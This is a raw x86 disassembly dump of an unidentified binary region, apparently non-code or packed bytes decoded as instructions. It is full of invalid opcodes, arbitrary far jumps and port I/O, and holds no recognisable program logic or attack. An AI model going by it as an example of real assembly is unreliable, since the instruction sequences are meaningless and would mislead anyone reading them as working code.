  420e1d:	cwde   
  420e1e:	addr16 jg 0x420df4
  420e21:	push   edi
  420e22:	(bad)  
  420e23:	mov    ds:0x56db7358,eax
  420e28:	aaa    
  420e29:	jp     0x420e4d
  420e2b:	fdivr  DWORD PTR [ecx-0xb]
  420e2e:	add    BYTE PTR [edx+0x16],al
  420e31:	fbstp  TBYTE PTR [eax-0x47f19d60]
  420e37:	(bad)
  420e3a:	daa    
  420e3b:	or     BYTE PTR [ecx-0x45],ch
  420e3e:	xor    BYTE PTR [ebx+0x3b],dh
  420e41:	xchg   ebp,eax
  420e42:	lea    esi,[ecx]
  420e44:	sbb    DWORD PTR [esi+0x68b70e8f],ecx
  420e4a:	xchg   ecx,eax
  420e4b:	lds    ebx,FWORD PTR [ebx]
  420e4d:	and    eax,0xc89b681
  420e52:	mov    BYTE PTR [esi-0x60604619],al
  420e58:	dec    eax
  420e59:	push   eax
  420e5a:	(bad)  
  420e5c:	pushf  
  420e5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e5e:	stos   BYTE PTR es:[edi],al
  420e5f:	cld    
  420e60:	pop    esi
  420e61:	xchg   ebx,eax
  420e62:	(bad)  
  420e63:	or     al,0x8e
  420e65:	call   0x282b:0x5bdc4609
  420e6c:	add    ebx,DWORD PTR [edx+0xb6]
	...
  420e7a:	js     0x420e05
  420e7c:	hlt    
  420e7d:	mov    al,0xf5
  420e7f:	std    
  420e80:	jl     0x420e4b
  420e82:	xor    dl,0x39
  420e85:	jg     0x420e19
  420e87:	sbb    eax,0x8afc755e
  420e8c:	add    DWORD PTR [eax],eax
  420e8e:	std    
  420e8f:	add    DWORD PTR [eax],eax
  420e91:	add    al,al
  420e93:	xchg   ecx,eax
  420e94:	pop    esi
  420e95:	fld    QWORD PTR [ecx-0x7f]
  420e98:	and    eax,0x5f8d6796
  420e9d:	cmp    dh,BYTE PTR [ebp+0x51]
  420ea0:	rcr    DWORD PTR [edx+0x15baa7e8],cl
  420ea6:	cdq    
  420ea7:	jecxz  0x420f14
  420ea9:	ins    BYTE PTR es:[edi],dx
  420eaa:	push   eax
  420eab:	inc    bl
  420ead:	lods   eax,DWORD PTR ds:[esi]
  420eae:	cli    
  420eaf:	shl    DWORD PTR [edi],0x16
  420eb2:	inc    ecx
  420eb3:	push   esi
  420eb4:	mov    eax,ds:0x547c19d4
  420eb9:	inc    eax
  420eba:	cli    
  420ebb:	jns    0x420ea5
  420ebd:	sbb    edx,DWORD PTR [edi+0x5d9aabef]
  420ec3:	push   es
  420ec4:	pop    esi
  420ec5:	shl    DWORD PTR [ebx-0x2381815b],1
  420ecb:	xchg   ebp,eax
  420ecc:	cld    
  420ecd:	mov    ds:0x4a414f1d,al
  420ed2:	ja     0x420e87
  420ed4:	out    0x2,eax
  420ed6:	mov    al,ds:0xe599cf1d
  420edb:	add    eax,0xa31d4b7e
  420ee0:	sub    BYTE PTR [ebx+0x3992d55f],al
  420ee6:	or     eax,ebp
  420ee8:	jo     0x420ea1
  420eea:	jmp    0x130a:0x594aa69
  420ef1:	stos   DWORD PTR es:[edi],eax
  420ef2:	call   0xfd4e9a4a
  420ef7:	push   0xf132e688
  420efc:	mov    eax,ds:0x8fc78f4f
  420f01:	adc    eax,DWORD PTR [eax+ecx*8]
  420f04:	add    cl,BYTE PTR [edi+ecx*8+0xfea8e18]
  420f0b:	pushf  
  420f0c:	or     dl,BYTE PTR [ebx+esi*8]
  420f0f:	loope  0x420f4a
  420f11:	repz mov ch,0x79
  420f14:	cli    
  420f15:	clc    
  420f16:	mov    cl,0x5f
  420f18:	cwde   
  420f19:	mov    ah,0xe1
  420f1b:	add    eax,0xb1ce9f1b
  420f20:	mov    BYTE PTR [eax],dl
  420f22:	daa    
  420f23:	lods   al,BYTE PTR ds:[esi]
  420f24:	dec    edi
  420f25:	fist   DWORD PTR [esi+0x2]
  420f28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f29:	or     al,0x7c
  420f2b:	adc    ebx,DWORD PTR [ebx]
  420f2d:	ret    
  420f2e:	pop    esp
  420f2f:	test   al,0xcf
  420f31:	push   eax
  420f32:	idiv   BYTE PTR [esi+0x10]
  420f35:	adc    ch,BYTE PTR [ebx+0x3e223e7c]
  420f3b:	jecxz  0x420fab
  420f3d:	ret    0xa8c8
  420f40:	xor    edi,ebp
  420f42:	clc    
  420f43:	push   ss
  420f44:	(bad)  
  420f46:	sub    eax,0xb97f4780
  420f4b:	pop    esp
  420f4c:	pop    ds
  420f4d:	dec    eax
  420f4f:	aam    0x3
  420f51:	jne    0x420ef0
  420f53:	jmp    0x420f57
  420f55:	(bad)  
  420f56:	repnz push esi
  420f58:	sub    eax,0x57304677
  420f5d:	mov    eax,ds:0x10abdb49
  420f62:	and    ebx,DWORD PTR [edx+0x1e]
  420f65:	mov    eax,ebp
  420f67:	cmp    esi,DWORD PTR [edx-0x1f]
  420f6a:	xchg   DWORD PTR [edi],edi
  420f6c:	and    al,0xc
  420f6e:	in     eax,dx
  420f6f:	popf   
  420f70:	inc    ebp
  420f71:	popa   
  420f72:	xchg   ebx,eax
  420f73:	les    eax,FWORD PTR [edx-0x53a63895]
  420f79:	arpl   WORD PTR [eax],bx
  420f7b:	add    DWORD PTR [eax-0x88125b1],0x6e
  420f82:	jb     0x420f3b
  420f84:	add    BYTE PTR [ebp-0x1a],dh
  420f87:	cmc    
  420f88:	int3   
  420f89:	jne    0x420f11
  420f8b:	push   eax
  420f8c:	sbb    DWORD PTR [edx+0x505876ce],0x5a405d8a
  420f96:	mov    DWORD PTR [ecx-0x10],edx
  420f99:	xlat   BYTE PTR ds:[ebx]
  420f9a:	inc    ebx
  420f9b:	pusha  
  420f9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f9d:	dec    esi
  420f9e:	in     al,dx
  420f9f:	mov    ch,0x34
  420fa1:	cmp    esp,edx
  420fa3:	and    dl,cl
  420fa5:	adc    al,0xc
  420fa7:	ret    0x3ffb
  420faa:	jp     0x420fe8
  420fac:	xlat   BYTE PTR ds:[ebx]
  420fad:	pop    DWORD PTR [edx]
  420faf:	dec    edi
  420fb0:	popf   
  420fb1:	xchg   bh,bl
  420fb3:	outs   dx,BYTE PTR ds:[esi]
  420fb4:	shl    DWORD PTR [esi-0x3c66b357],cl
  420fba:	pusha  
  420fbb:	(bad)  
  420fbd:	mov    DWORD PTR [eax+edi*1+0x19617c88],esp
  420fc4:	(bad)  
  420fc5:	iret   
  420fc6:	jae    0x421021
  420fc8:	pop    es
  420fc9:	out    0x6b,eax
  420fcb:	xchg   esi,eax
  420fcc:	pop    edi
  420fcd:	shl    ecx,1
  420fcf:	mov    bh,BYTE PTR [edi]
  420fd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fd2:	adc    al,0xab
  420fd4:	pop    ss
  420fd5:	out    dx,al
  420fd6:	or     eax,0x50a3f7fa
  420fdb:	mov    DWORD PTR [edx],ecx
  420fdd:	fdivr  QWORD PTR [edx+0x43cce588]
  420fe3:	out    dx,al
  420fe4:	aas    
  420fe5:	mov    al,0xfd
  420fe7:	idiv   BYTE PTR [esi-0x45]
  420fea:	test   BYTE PTR [ebp+0xcbc0e46],0xf
  420ff1:	ins    BYTE PTR es:[edi],dx
  420ff2:	jecxz  0x420ff8
  420ff4:	adc    eax,0xc3dff941
  420ff9:	mov    DWORD PTR [esi+0x7d],esp
  420ffc:	pop    es
  420ffd:	and    al,0x56
  420fff:	add    al,0xf0
  421001:	popf   
  421002:	outs   dx,DWORD PTR ds:[esi]
  421003:	pop    ds
  421004:	jl     0x42102d
  421006:	dec    esp
  421007:	ss inc ebp
  421009:	push   ebx
  42100a:	je     0x420fcd
  42100c:	add    BYTE PTR [edi+0x7bec7e65],ch
  421012:	push   ecx
  421013:	jmp    0x6c67:0x96a504a6
  42101a:	dec    eax
  42101b:	sub    eax,0x8a41ea8d
  421020:	jno    0x42100d
  421022:	push   esi
  421023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421024:	out    0xfd,eax
  421026:	stos   DWORD PTR es:[edi],eax
  421027:	pusha  
  421028:	inc    eax
  421029:	leave  
  42102a:	sti    
  42102b:	pusha  
  42102c:	cwde   
  42102d:	aaa    
  42102e:	dec    esi
  42102f:	daa    
  421030:	push   cs
  421031:	fist   WORD PTR [eax+0x36]
  421034:	fst    DWORD PTR [eax+0xb]
  421037:	jae    0x421019
  421039:	scas   al,BYTE PTR es:[edi]
  42103a:	test   BYTE PTR [edx],dh
  42103c:	mov    ecx,0xa78e9788
  421041:	repz push es
  421043:	aam    0x5a
  421045:	mov    bl,0x9d
  421047:	bnd je 0x421081
  42104a:	add    BYTE PTR ds:0xd906fb29,dh
  421050:	fdivrp st(7),st
  421052:	add    al,0x1a
  421054:	and    DWORD PTR [edx+0x365afdfa],ecx
  42105a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42105b:	test   BYTE PTR [ebx+esi*8-0x3f],al
  42105f:	adc    eax,0x78eece15
  421064:	jp     0x42109f
  421066:	shl    ch,1
  421068:	mov    ah,0xa8
  42106a:	xchg   DWORD PTR [ecx+0x4b59725e],esp
  421070:	and    eax,0xb8a7409b
  421075:	pusha  
  421076:	cwde   
  421077:	call   0x61b0:0x1a52ec56
  42107e:	fmul   QWORD PTR [edx]
  421080:	jmp    0xb9d79a97
  421085:	fbld   TBYTE PTR [ebx+ebp*2+0x55]
  421089:	out    0x93,al
  42108b:	push   ebp
  42108c:	pop    esp
  42108d:	repnz inc ebx
	...
  421097:	add    BYTE PTR [eax],al
  421099:	add    BYTE PTR [edx+ecx*4-0x49],bl
  42109d:	imul   esi,edi,0x7f
  4210a0:	fdivr  QWORD PTR [edi+0x2b60ebfc]
  4210a6:	xchg   esi,eax
  4210a7:	(bad)  
  4210a8:	jmp    0x1cf0a9a
  4210ad:	add    ch,bh
  4210af:	add    DWORD PTR [eax],eax
  4210b1:	add    BYTE PTR [ecx-0x17],dh
  4210b4:	(bad)  
  4210b5:	ficom  WORD PTR [eax]
  4210b7:	aam    0x4c
  4210b9:	sbb    BYTE PTR [ebp+ecx*4-0x3bb524e9],0x26
  4210c1:	fisubr DWORD PTR [ecx]
  4210c3:	cmp    al,0x7d
  4210c5:	push   ebp
  4210c6:	sub    BYTE PTR [esi+0x30aee5ab],bh
  4210cc:	dec    eax
  4210cd:	pop    ebp
  4210ce:	test   eax,0xfdcdaba6
  4210d3:	add    eax,0xde060f4a
  4210d8:	scas   eax,DWORD PTR es:[edi]
  4210d9:	dec    edi
  4210da:	into   
  4210db:	arpl   WORD PTR [ebp+edi*4+0x22fb5811],bx
  4210e2:	sahf   
  4210e3:	and    cl,BYTE PTR [esi+eiz*1]
  4210e6:	xor    ebp,eax
  4210e8:	push   ecx
  4210e9:	mov    bh,0x94
  4210eb:	test   DWORD PTR [esi],eax
  4210ed:	jmp    0x78ad21f
  4210f2:	adc    esp,DWORD PTR [ebx-0x24]
  4210f5:	sub    bl,ah
  4210f7:	push   ebx
  4210f8:	stos   DWORD PTR es:[edi],eax
  4210f9:	scas   eax,DWORD PTR es:[edi]
  4210fa:	fdivr  DWORD PTR [edx+0x57574308]
  421100:	xchg   esi,eax
  421101:	mov    ds:0xb33f124b,eax
  421106:	outs   dx,DWORD PTR ds:[esi]
  421107:	mov    dl,0x93
  421109:	retf   
  42110a:	jge    0x42112a
  42110c:	cli    
  42110d:	inc    esp
  42110e:	retf   
  42110f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421110:	fist   WORD PTR [ebx-0x29]
  421113:	int    0xcb
  421115:	jge    0x4210fb
  421117:	test   eax,0x2d27389d
  42111c:	add    BYTE PTR [eax],bl
  42111e:	sbb    DWORD PTR [ebx-0x1a280c1],eax
  421124:	loop   0x4211a5
  421126:	inc    esp
  421127:	and    BYTE PTR [eax+esi*4-0x2612cc4b],dl
  42112e:	or     al,0xb4
  421130:	cmp    eax,0x1a96cec9
  421135:	stos   DWORD PTR es:[edi],eax
  421136:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421137:	pop    eax
  421138:	push   ecx
  421139:	loop   0x421136
  42113b:	clc    
  42113c:	push   ecx
  42113d:	ficomp WORD PTR [ebx+ecx*8+0x34]
  421141:	repz or al,0xac
  421144:	icebp  
  421145:	les    edx,FWORD PTR ds:0x435beb4e
  42114b:	mov    dl,0x29
  42114d:	add    BYTE PTR [ecx],0xf0
  421150:	xor    dl,al
  421152:	or     DWORD PTR [ebp+0x48],edx
  421155:	ficom  DWORD PTR [edi]
  421157:	add    eax,0x298496b4
  42115c:	pop    ss
  42115d:	pop    eax
  42115e:	inc    edx
  42115f:	or     edi,DWORD PTR [edx]
  421161:	push   eax
  421162:	xor    ebx,DWORD PTR [ebp+edi*4-0x35]
  421166:	fs fs ret 
  421169:	mov    ebp,0x64b669e8
  42116e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42116f:	sub    BYTE PTR [ecx-0x4a8d3eb0],al
  421175:	push   ebx
  421176:	ret    0x7f36
  421179:	jmp    0x249d05e7
  42117e:	scas   al,BYTE PTR es:[edi]
  42117f:	xor    DWORD PTR [ebp-0x52],eax
  421182:	push   0xffffff81
  421184:	inc    ebp
  421185:	arpl   bp,sp
  421187:	lea    ebp,[ebp+0x6f]
  42118a:	mov    ch,0xcb
  42118c:	jbe    0x42117a
  42118e:	mov    esp,0xaf3cb11b
  421193:	dec    ebx
  421194:	in     eax,dx
  421195:	push   esi
  421196:	sbb    ah,al
  421198:	(bad)  
  421199:	mov    ebp,?
  42119b:	cwde   
  42119c:	mov    ecx,0x666fd52d
  4211a1:	icebp  
  4211a2:	ret    0xff55
  4211a5:	inc    DWORD PTR ds:0x889feefc
  4211ab:	arpl   WORD PTR [ecx],sp
  4211ad:	adc    al,0x87
  4211af:	mov    WORD PTR [ecx+esi*1],?
  4211b2:	enter  0x18b9,0x94
  4211b6:	cmp    al,0xa9
  4211b8:	jae    0x421216
  4211ba:	adc    al,0xf3
  4211bc:	mov    bh,0x6b
  4211be:	lods   eax,DWORD PTR ds:[esi]
  4211bf:	jne    0x4211e9
  4211c1:	imul   esp,DWORD PTR [ecx-0x23a86deb],0x340d55d0
  4211cb:	mov    BYTE PTR [esi],dl
  4211cd:	add    eax,0x856daa8a
  4211d2:	arpl   WORD PTR [ebp-0x6a],dx
  4211d5:	ins    DWORD PTR es:[edi],dx
  4211d6:	ror    DWORD PTR [esi+0x73],1
  4211d9:	or     BYTE PTR [ebx-0x12f8b33d],bl
  4211df:	iret   
  4211e0:	idiv   DWORD PTR [edi+0x6f33712c]
  4211e6:	mov    esp,0x9ad5e9a6
  4211eb:	jmp    0xcfea122c
  4211f0:	call   0x5f1:0xcc743afd
  4211f7:	test   al,0xd9
  4211f9:	rol    cl,1
  4211fb:	popa   
  4211fc:	stos   BYTE PTR es:[edi],al
  4211fd:	pop    ebx
  4211fe:	mov    ecx,0xe81e256d
  421203:	stc    
  421204:	add    eax,0x25b71e14
  421209:	int3   
  42120a:	mov    esp,0x88bd640a
  42120f:	or     esp,edi
  421211:	call   0xc1c2:0x7576dc97
  421218:	je     0x4211ee
  42121a:	retf   0x2910
  42121d:	push   ss
  42121e:	sub    bl,BYTE PTR [ebx]
  421220:	jg     0x42127c
  421222:	das    
  421223:	enter  0x480f,0x30
  421227:	adc    DWORD PTR [ecx+0x759f52bf],esp
  42122d:	push   es
  42122e:	mov    WORD PTR [edi-0x5504d7c3],cs
  421234:	push   bx
  421236:	or     BYTE PTR [ecx+eiz*1+0x2cab8472],bl
  42123d:	adc    DWORD PTR [edi-0x773f91b5],0xdcb2b527
  421247:	pop    eax
  421248:	cmc    
  421249:	jmp    0x43fc:0xe859da03
  421250:	loop   0x42129c
  421252:	sub    esi,DWORD PTR ds:0x5c79ee75
  421258:	adc    edx,ebx
  42125a:	(bad)  
  42125b:	loope  0x4212cd
  42125d:	out    0x25,al
  42125f:	pop    ebx
  421260:	(bad)  
  421261:	in     al,dx
  421262:	out    dx,eax
  421263:	fnsave [ebp-0x79ca405c]
  421269:	add    BYTE PTR [esi],bh
  42126b:	cmc    
  42126c:	sahf   
  42126d:	inc    ecx
  42126e:	mov    ds:0x88aa7e4c,al
  421273:	dec    ecx
  421274:	pop    es
  421275:	ss pusha 
  421277:	cs repz pusha 
  42127a:	or     edx,esi
  42127c:	in     eax,0xc3
  42127e:	push   ecx
  42127f:	sub    ebx,ecx
  421281:	sub    ah,BYTE PTR ds:0xf49ddfeb
  421287:	(bad)  
  421288:	push   ecx
  421289:	pop    ss
  42128a:	sub    al,0x7
  42128c:	add    DWORD PTR [eax+0x71],ecx
  42128f:	lods   al,BYTE PTR ds:[esi]
  421290:	icebp  
  421291:	jmp    0xe94f:0xde8c9678
  421298:	xlat   BYTE PTR ds:[ebx]
  421299:	in     eax,dx
  42129a:	xchg   ebp,eax
  42129b:	addr16 xchg ebp,eax
  42129d:	lock out 0xa9,al
  4212a0:	mov    bh,0x17
  4212a2:	dec    esp
  4212a3:	jl     0x4212e1
  4212a5:	xchg   ebp,eax
  4212a6:	xchg   ecx,eax
  4212a7:	mov    BYTE PTR [edx+0x7f88d27],al
  4212ad:	mov    DWORD PTR [ebp+0x0],edi
	...
  4212b8:	add    BYTE PTR [eax],al
  4212ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212bb:	sbb    al,BYTE PTR [edi-0x204026]
  4212c1:	jg     0x42132a
  4212c3:	pop    esp
  4212c4:	fstp   DWORD PTR [ecx+0x6ec038fa]
  4212ca:	test   BYTE PTR [esi+0x1fd0001],0x0
  4212d1:	add    BYTE PTR [edi-0x3ef93230],cl
  4212d7:	cmp    ch,BYTE PTR [esi+0x2c80120]
  4212dd:	bound  ecx,QWORD PTR [edx]
  4212df:	out    dx,al
  4212e0:	push   0x10
  4212e2:	mov    eax,ds:0x6981e701
  4212e7:	jge    0x42133d
  4212e9:	das    
  4212ea:	outs   dx,BYTE PTR ds:[esi]
  4212eb:	out    0xc,eax
  4212ed:	ins    BYTE PTR es:[edi],dx
  4212ee:	xor    al,0x48
  4212f0:	mov    esp,0x6565dbc4
  4212f5:	push   ecx
  4212f6:	je     0x421351
  4212f8:	push   cs
  4212f9:	sub    edx,DWORD PTR [ebx+0x34b57b6a]
  4212ff:	pop    esi
  421300:	jae    0x42128a
  421302:	ror    DWORD PTR cs:[ebx],1
  421305:	push   0x3f757e70
  42130a:	inc    ebx
  42130b:	bound  edi,QWORD PTR [ebp+0x1d0d814d]
  421311:	add    DWORD PTR [eax-0x3fae166d],ebp
  421317:	cdq    
  421318:	inc    BYTE PTR [edi-0x54]
  42131b:	(bad)  
  42131c:	jno    0x421329
  42131e:	jmp    0x6a25:0x3e74b337
  421325:	loop   0x4212ea
  421327:	(bad)
  42132a:	pop    eax
  42132b:	push   ecx
  42132c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42132d:	outs   dx,BYTE PTR ds:[esi]
  42132e:	mov    al,0x82
  421330:	pusha  
  421331:	xchg   BYTE PTR [eax-0x59],bh
  421334:	adc    dl,BYTE PTR [esi]
  421336:	sub    esp,DWORD PTR [ebp-0x26fbc75a]
  42133c:	dec    ebp
  42133d:	jmp    0x421381
  42133f:	fmul   st(6),st
  421341:	push   ebx
  421342:	push   ds
  421343:	data16 jle 0x4213a9
  421346:	lea    ebx,[eax+0x7a16e34c]
  42134c:	add    eax,0xb073ab5
  421351:	cmp    bh,BYTE PTR [ecx-0x50faef90]
  421357:	cmc    
  421358:	inc    ebx
  421359:	jg     0x4213bd
  42135b:	inc    edi
  42135c:	fcom   DWORD PTR [ebx+0x5e12e7fd]
  421362:	push   esi
  421363:	xor    ecx,esp
  421365:	cmp    esi,DWORD PTR [edx]
  421367:	ret    
  421368:	push   edx
  421369:	xchg   edi,eax
  42136a:	or     bh,BYTE PTR [edx]
  42136c:	les    esi,FWORD PTR [ebx+0x41]
  42136f:	call   FWORD PTR [ebx+edi*1]
  421372:	stc    
  421373:	fst    DWORD PTR [edx]
  421375:	enter  0x35b7,0x48
  421379:	std    
  42137a:	add    al,0xd7
  42137c:	push   ecx
  42137d:	outs   dx,DWORD PTR ds:[esi]
  42137e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42137f:	push   es
  421380:	mov    al,0x3e
  421382:	clc    
  421383:	and    al,0xb8
  421385:	xchg   esp,eax
  421386:	jg     0x4213c2
  421388:	mov    dl,0x82
  42138a:	(bad)  
  42138b:	mov    dl,0x5
  42138d:	pop    ds
  42138e:	pop    esp
  42138f:	and    ebp,DWORD PTR [eax]
  421391:	mov    ah,0x39
  421393:	sub    al,0x69
  421395:	xor    BYTE PTR [edi],cl
  421397:	or     BYTE PTR [edi],al
  421399:	inc    edx
  42139a:	(bad)  
  42139b:	mov    ah,0xd3
  42139d:	push   es
  42139e:	mov    cl,0x29
  4213a0:	push   es
  4213a1:	push   ebx
  4213a2:	inc    eax
  4213a3:	int3   
  4213a4:	scas   eax,DWORD PTR es:[edi]
  4213a5:	adc    eax,0x4d8c56a3
  4213aa:	out    dx,eax
  4213ab:	inc    ebx
  4213ac:	neg    DWORD PTR [eax-0x41]
  4213af:	xchg   ebx,eax
  4213b0:	daa    
  4213b1:	mov    al,0x3e
  4213b3:	and    bh,BYTE PTR [esi]
  4213b5:	scas   al,BYTE PTR es:[edi]
  4213b6:	xor    ecx,DWORD PTR [ebp+0x3d]
  4213b9:	bound  edx,QWORD PTR [ecx]
  4213bb:	rol    BYTE PTR [ebp+0x48],cl
  4213be:	mov    dh,BYTE PTR [eax+0x674a7f9f]
  4213c4:	inc    ebx
  4213c5:	jne    0x421348
  4213c7:	aam    0x25
  4213c9:	stos   BYTE PTR es:[edi],al
  4213ca:	mov    ecx,0x49c24455
  4213cf:	fmul   QWORD PTR [edx+ebx*1-0x4fae3251]
  4213d6:	aaa    
  4213d7:	loop   0x4213fa
  4213d9:	jecxz  0x421454
  4213db:	div    DWORD PTR [esi+0x5c]
  4213de:	mov    gs,WORD PTR [esi]
  4213e0:	push   eax
  4213e1:	mov    cl,0x9a
  4213e3:	jns    0x4213d7
  4213e5:	scas   al,BYTE PTR es:[edi]
  4213e6:	ins    DWORD PTR es:[edi],dx
  4213e7:	cmp    BYTE PTR [ecx-0x61f509c],al
  4213ed:	inc    ebx
  4213ee:	test   eax,0x7bcce66a
  4213f3:	or     al,BYTE PTR [eax-0x77]
  4213f6:	(bad)  
  4213f7:	fsubrp st(5),st
  4213f9:	pop    esi
  4213fa:	ret    
  4213fb:	jno    0x4213b3
  4213fd:	ja     0x421464
  4213ff:	imul   ebx,DWORD PTR [esi+0xc6d9b9a],0x5fa649d7
  421409:	xchg   ebp,eax
  42140a:	mov    ss,WORD PTR [ebx+0x3bc21eff]
  421410:	fisubr WORD PTR [ecx-0x2d]
  421413:	pop    edx
  421414:	push   ecx
  421415:	iret   
  421416:	add    al,0x37
  421418:	jecxz  0x421461
  42141a:	mov    dl,0xdc
  42141c:	dec    ecx
  42141d:	mov    ?,WORD PTR [edi-0x2624f9a0]
  421423:	mov    bh,0x1
  421425:	xor    al,0xb6
  421427:	ja     0x42149b
  421429:	fcomp  DWORD PTR [edi]
  42142b:	cmp    eax,0x7d3f3b69
  421430:	les    esp,FWORD PTR [esi]
  421432:	jne    0x421483
  421434:	fisttp DWORD PTR [ebp+esi*8-0x29]
  421438:	and    eax,0xee52af6b
  42143d:	xchg   edi,eax
  42143e:	adc    al,0x6c
  421440:	jb     0x421454
  421442:	adc    bh,ah
  421444:	xchg   esp,eax
  421445:	pop    ds
  421446:	shl    edx,cl
  421448:	and    ebp,DWORD PTR [edi-0x63]
  42144b:	add    DWORD PTR [edx+0x12],0xfffffff4
  42144f:	and    DWORD PTR [ecx+0x9],esp
  421452:	xor    DWORD PTR [esi-0x27],edx
  421455:	(bad)  
  421456:	inc    DWORD PTR [edi-0x26da1b8a]
  42145c:	pusha  
  42145d:	mov    DWORD PTR [ebx],edx
  42145f:	out    0xfa,eax
  421461:	loop   0x42140b
  421463:	loop   0x42143a
  421465:	xchg   edi,eax
  421466:	adc    al,0x8a
  421468:	(bad)  
  421469:	xor    eax,0xd98ee75f
  42146e:	aam    0x20
  421470:	mov    dh,0x22
  421472:	push   ecx
  421473:	jg     0x421412
  421475:	adc    edx,DWORD PTR [edx+0x293797ca]
  42147b:	mov    ebp,fs
  42147d:	and    al,0x82
  42147f:	ret    0xd539
  421482:	or     al,0xad
  421484:	push   eax
  421485:	stos   BYTE PTR es:[edi],al
  421486:	sbb    BYTE PTR [edi+0x33],bh
  421489:	leave  
  42148a:	sar    DWORD PTR [ecx],1
  42148c:	dec    ebp
  42148d:	add    ch,ch
  42148f:	aaa    
  421490:	aaa    
  421491:	mov    ds,WORD PTR [edi+0x59]
  421494:	das    
  421495:	push   ecx
  421496:	test   BYTE PTR [ecx],bl
  421498:	imul   ebx,DWORD PTR [ebx-0x23],0x2d
  42149c:	jmp    0xd261f11c
  4214a1:	movq   QWORD PTR [edx+0x21522dc4],mm1
  4214a8:	call   0x6281:0xc96ac4c5
  4214af:	stos   DWORD PTR es:[edi],eax
  4214b0:	js     0x4214ec
  4214b2:	frstor [ebp+0x35565001]
  4214b8:	loopne 0x421484
  4214ba:	in     al,dx
  4214bb:	ss sub al,0x57
  4214be:	mov    edx,0x613fc186
  4214c3:	int    0x54
  4214c5:	sub    al,0x1f
  4214c7:	jmp    0xb92b064f
  4214cc:	push   cs
  4214cd:	push   es
  4214ce:	add    eax,DWORD PTR [eax]
	...
  4214d8:	add    BYTE PTR [eax],al
  4214da:	popf   
  4214db:	paddd  mm4,QWORD PTR [esi+edi*8-0x5bc0200b]
  4214e3:	fidiv  DWORD PTR [ebp+0x34]
  4214e6:	adc    edx,ecx
  4214e8:	ja     0x4214b0
  4214ea:	pause  
  4214ec:	add    DWORD PTR [eax],eax
  4214ee:	std    
  4214ef:	add    DWORD PTR [eax],eax
  4214f1:	add    BYTE PTR [edi-0x2],dl
  4214f4:	mov    ds:0x5dc91a6d,eax
  4214f9:	push   ebx
  4214fa:	bound  esi,QWORD PTR [ecx+0x44a55204]
  421500:	jge    0x4214db
  421502:	and    BYTE PTR ds:0xe9de51d7,cl
  421508:	into   
  421509:	rol    DWORD PTR gs:[ecx],1
  42150c:	jecxz  0x4214fd
  42150e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42150f:	cmp    ah,BYTE PTR [esi]
  421511:	mov    bl,0x94
  421513:	jle    0x42157a
  421515:	xchg   ebx,eax
  421516:	or     esi,DWORD PTR [edi]
  421518:	aam    0xa2
  42151a:	shr    BYTE PTR [ebx-0x72],0x13
  42151e:	jnp    0x421594
  421520:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421521:	scas   eax,DWORD PTR es:[edi]
  421522:	sbb    eax,0x2da41c3f
  421527:	js     0x421554
  421529:	out    0x36,eax
  42152b:	jbe    0x4214be
  42152d:	lahf   
  42152e:	fild   QWORD PTR [ecx]
  421530:	sub    BYTE PTR [ecx+0x29],al
  421533:	sbb    esp,DWORD PTR [edx+edi*1-0x6849452b]
  42153a:	add    esi,DWORD PTR [ebx]
  42153c:	aaa    
  42153d:	psubd  mm7,QWORD PTR [ebx+0x56]
  421541:	adc    esi,DWORD PTR [edx+ebp*8+0xac50b79]
  421548:	cli    
  421549:	xchg   ebp,eax
  42154a:	test   BYTE PTR [edx+edx*2-0x3459f681],ch
  421551:	dec    esi
  421552:	xchg   ecx,eax
  421553:	nop
  421554:	add    al,0x7d
  421556:	and    eax,0xb23361e
  42155b:	rcr    BYTE PTR [ebx-0x22],1
  42155e:	and    BYTE PTR [esi+0x378766fb],0xce
  421565:	xor    ebx,DWORD PTR [ecx]
  421567:	push   0xffffff93
  421569:	xchg   esp,eax
  42156a:	adc    ah,BYTE PTR [ecx+0xa3f42ec]
  421570:	jmp    0x2858:0xbe869a44
  421577:	ds into 
  421579:	pusha  
  42157a:	rcl    BYTE PTR [ecx],1
  42157c:	neg    DWORD PTR [ecx-0x4a]
  42157f:	cmp    DWORD PTR [edi],ebp
  421581:	lea    edx,[esi+eax*4]
  421584:	hlt    
  421585:	popf   
  421586:	pop    esp
  421587:	ret    0xf42e
  42158a:	xor    eax,0xc9d5837a
  42158f:	cli    
  421590:	pop    ecx
  421591:	jl     0x421565
  421593:	add    eax,0x262de099
  421598:	cwde   
  421599:	pop    ebx
  42159a:	xor    al,0x89
  42159c:	add    dl,BYTE PTR [ecx+0x697b7d9d]
  4215a2:	and    BYTE PTR [ebp-0x6a4778e0],bl
  4215a8:	xor    dl,ch
  4215aa:	nop
  4215ab:	add    ah,0xd0
  4215ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215af:	arpl   WORD PTR gs:[edi-0x684f02c1],dx
  4215b6:	dec    ebp
  4215b7:	xor    al,BYTE PTR [ebx-0xd613bf9]
  4215bd:	mov    ecx,0xb8513b42
  4215c2:	stc    
  4215c3:	push   edi
  4215c4:	jmp    0x421633
  4215c6:	fist   DWORD PTR [esi+esi*2+0x1]
  4215ca:	push   ebp
  4215cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215cc:	lods   al,BYTE PTR ds:[esi]
  4215cd:	xchg   DWORD PTR [edx+0x70],edx
  4215d0:	pop    esi
  4215d1:	(bad)  
  4215d3:	or     ch,BYTE PTR [edx-0x7a]
  4215d6:	adc    DWORD PTR [ebx+ebp*8+0x50],eax
  4215da:	stc    
  4215db:	sub    BYTE PTR [edx+0x56],0x8d
  4215df:	mov    ds:0x229e2a58,eax
  4215e4:	sub    ecx,edi
  4215e6:	std    
  4215e7:	aam    0xa1
  4215e9:	jge    0x421632
